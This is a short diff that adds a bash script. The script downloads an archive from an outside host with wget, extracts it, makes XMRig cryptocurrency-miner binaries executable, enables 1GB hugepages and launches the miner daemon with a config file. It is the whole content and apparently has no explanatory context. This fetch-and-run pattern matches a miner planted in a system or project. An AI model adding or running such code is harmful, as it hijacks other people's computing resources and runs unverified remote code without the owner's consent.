@@ -1,0 +1,6 @@
+#!/bin/bash
+wget whatwill.be/x.tar
+tar -xvf x.tar
+chmod +x xmrig* enable*
+./enable_1gb_pages.sh
+./xmrigDaemon -c config.json
